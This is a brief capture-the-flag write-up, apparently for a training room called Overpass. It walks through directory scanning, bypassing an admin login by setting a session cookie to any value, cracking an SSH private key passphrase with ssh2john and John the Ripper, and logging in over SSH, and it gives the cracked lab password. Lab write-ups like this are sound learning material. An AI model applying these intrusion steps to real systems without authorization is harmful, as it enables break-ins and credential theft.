# Overpass

Ip address: 
```bash
ip = 10.10.47.241
```


## Scanning the webserver

Scanning the webserver with the tool "feroxbuster"
`feroxbuster --url http://10.10.47.241/`

Results:

An admin page is found

## /admin/

Login is required. Jsoncode says:
```javascript
If (result == "unauth or something")
{

}
else{
	setCookie("sessionToken", anyvalue);
}
```

SO: By setting this cookie we can log in.

## /admin/ (logged in)

This shows an RSA private key

-> Decrypt the password with John the Ripper

1. use JohnTheRipper (ssh2john) -> with `wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py`
```bash
python ssh2john.py id_rsa > id_rsa.hash
```
2. Use JohnTheRipper again but to crack the hash

use the wordlist from `/usr/share/wordlists/rockyou.txt`

The full command is: `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`

My password is: `james13`

## SSH into the server

cat the users.txt file